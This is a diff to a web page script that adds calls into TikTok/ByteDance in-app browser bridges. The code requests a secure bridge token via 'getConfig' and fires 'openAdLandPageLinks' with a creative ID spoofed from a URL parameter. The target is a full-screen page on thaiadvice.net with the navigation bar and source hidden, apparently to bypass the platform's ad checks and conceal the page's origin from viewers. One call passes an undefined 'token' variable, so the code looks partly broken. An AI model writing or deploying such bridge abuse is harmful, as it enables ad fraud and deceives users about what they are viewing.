@@ -211,26 +211,38 @@ function closePrivacy(){document.getElementById('privacyModal').classList.remove
 
   var wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
   var CID = 1869709729112081;
-  // Try dynamic CID from URL (utm_id may be the actual creative ID TikTok checks against)
   try { var _uid = new URLSearchParams(window.location.search).get('utm_id'); if(_uid) CID = parseInt(_uid); } catch(e){}
   var fsUrl = 'https://thaiadvice.net/page.html?hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
   log('cid='+CID);
 
+  // Try to get token via IESPiper getConfig (bare format)
+  if (wk) {
+    try {
+      wk.postMessage({func:'getConfig',params:{}});
+      log('ies getConfig sent');
+    } catch(e){ log('ies getConfig err:'+e); }
+  }
+
+  function fireIES(tok) {
+    if (!wk) return;
+    var p = {url:fsUrl,landingStyle:1,title:'',isDeeplink:1,refer:'landing_page',cid:CID};
+    if (tok) p._jsb_secure_token = tok;
+    try {
+      wk.postMessage({func:'openAdLandPageLinks',params:p});
+      log('ies fired tok='+(tok?'yes':'no'));
+    } catch(e){ log('ies fire err:'+e); }
+  }
+
   function tryAll(label) {
     var tt = window.ToutiaoJSBridge;
-    // landingStyle:1 no url
     if (tt && tt.call) {
-      try { tt.call('openAdLandPageLinks',{landingStyle:1,title:'',isDeeplink:1,refer:'landing_page',cid:CID},function(r){log(label+' tt ls1 cb:'+JSON.stringify(r));}); } catch(e){ log(label+' tt ls1 err:'+e); }
+      try { tt.call('openAdLandPageLinks',{url:fsUrl,landingStyle:1,title:'',isDeeplink:1,refer:'landing_page',cid:CID},function(r){log(label+' tt cb:'+JSON.stringify(r));}); } catch(e){ log(label+' tt err:'+e); }
     }
-    // landingStyle:0 with url
-    if (tt && tt.call) {
-      try { tt.call('openAdLandPageLinks',{url:fsUrl,landingStyle:0,title:'',isDeeplink:1,refer:'landing_page',cid:CID},function(r){log(label+' tt ls0 cb:'+JSON.stringify(r));}); } catch(e){}
-    }
-    // IESPiper landingStyle:1
-    if (wk) {
-      try { wk.postMessage({__msg_type:'call',func:'openAdLandPageLinks',JSSDK:'1.2.5',__callback_id:'cb1',params:{landingStyle:1,title:'',isDeeplink:1,refer:'landing_page',cid:CID}}); log(label+' ies sent'); } catch(e){ log(label+' ies err:'+e); }
-    }
+    fireIES(token);
   }
+
+  // Fire IESPiper immediately (available at load)
+  fireIES(null);
 
   setTimeout(function(){ log('1.5s tryAll'); tryAll('1.5s'); }, 1500);
 
